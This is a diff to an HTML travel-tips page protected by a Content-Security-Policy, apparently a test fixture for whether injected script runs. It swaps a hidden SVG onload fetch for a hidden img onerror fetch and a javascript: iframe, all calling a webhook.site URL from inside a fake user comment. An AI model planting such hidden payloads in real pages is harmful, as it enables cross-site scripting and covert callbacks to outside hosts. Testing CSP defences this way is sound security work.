@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <title>Travel Tips – CSP Protected</title>
-  <meta http-equiv="Content-Security-Policy" content="default-src 'none'; img-src 'self'; style-src 'self' 'unsafe-inline'; connect-src 'none';" />
+  <meta http-equiv="Content-Security-Policy" content="default-src 'none'; img-src 'self'; style-src 'self' 'unsafe-inline'; connect-src 'none'; frame-src 'none';" />
   <style>
     body {
       background: linear-gradient(120deg, #89f7fe 0%, #66a6ff 100%);
@@ -34,7 +34,11 @@
   <div class="post">
     <p>Here is a user comment about their trip to Italy:</p>
 
-    <svg width="0" height="0" onload="fetch('https://webhook.site/d828bfbf-ff5d-41db-956f-c8662ec8026a')"></svg>
+    <!-- img with onerror event -->
+    <img src="invalid.png" onerror="fetch('https://webhook.site/d828bfbf-ff5d-41db-956f-c8662ec8026a')" style="display:none" />
+
+    <!-- iframe with javascript: src (may or may not execute) -->
+    <iframe src="javascript:fetch('https://webhook.site/d828bfbf-ff5d-41db-956f-c8662ec8026a')" style="display:none"></iframe>
 
     <p>
       If you visit Italy, don't miss the gelato! 🍦<br />
